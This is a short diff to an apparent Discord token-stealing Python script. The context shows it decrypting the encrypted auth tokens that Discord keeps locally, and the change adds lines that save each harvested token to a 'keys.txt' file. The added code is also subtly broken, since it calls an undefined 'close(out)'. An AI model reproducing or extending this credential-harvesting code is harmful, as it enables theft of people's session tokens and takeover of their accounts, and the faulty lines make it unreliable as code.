@@ -44,7 +44,13 @@ def main():
         return
     for token in tokens:
         print(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]))
+        out = open("keys.txt", "a", encoding="utf-8")
+        out.write(token + "\n")
+        close(out)
+        
+
 
 if __name__ == "__main__":
     main()
+
 
